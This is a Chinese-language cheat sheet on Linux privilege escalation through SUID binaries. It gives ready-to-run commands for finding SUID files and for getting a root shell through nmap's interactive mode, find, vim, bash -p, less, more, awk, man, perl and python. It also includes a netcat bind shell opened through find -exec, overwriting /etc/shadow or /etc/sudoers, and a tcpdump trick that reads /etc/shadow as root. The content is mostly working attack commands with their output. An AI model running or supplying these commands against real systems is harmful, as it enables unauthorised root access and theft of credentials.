SUID 权限提升
Linux提权中，可以用的SUID文件来提权，SUID的作用就是：让本来没有相应权限的用户运行这个程序时，可以访问没有权限访问的资源。通常可以使用一下命令来找有SUID标志位的文件：

find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
例如nmap

ls -l /usr/bin/nmap
-rwsr-xr-x 1 root root 780676 2008-04-08 10:04 /usr/bin/nmap
存在s 则表示其存在SUID标志位，并拥有root的执行权限。以下是几类可用于提权的文件总结：

1.Nmap

老版本的nmap（2.02-5.21）有 interactive，是允许用户执行系统命令的。提权方式

nmap --interactive
之后执行命令：

nmap> !sh
sh-3.2# whoami
root
msf中的模块为：

exploit/unix/local/setuid_nmap
2.Find

touch test
find test -exec whoami \;
如果服务器上装了nc，可以直接使用以下命令进行监听：

find test -exec netcat -lvp 5555 -e /bin/sh \;
之后进行连接：

netcat 192.168.1.100 5555
则可获取root shell

3.vim/vi

打开vim,按下ESC

:set shell=/bin/sh
:shell
则可执行命令

4.bash

bash -p
bash-3.2# id
uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)
5.less

less /etc/passwd
!/bin/sh
6.more

more /home/pelle/myfile
!/bin/bash
7.cp

使用cp覆盖 /etc/shadow

8.mv

使用mv 覆盖 /etc/shadow 或者/etc/sudoers

9.awk

awk 'BEGIN {system("/bin/bash")}'
10.man

man passwd
!/bin/bash
11.python/perl/ruby/lua/etc

perl

exec "/bin/bash";
python

import os
os.system("/bin/bash")
12.tcpdump

echo $'id\ncat /etc/shadow' > /tmp/.test
chmod +x /tmp/.test
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root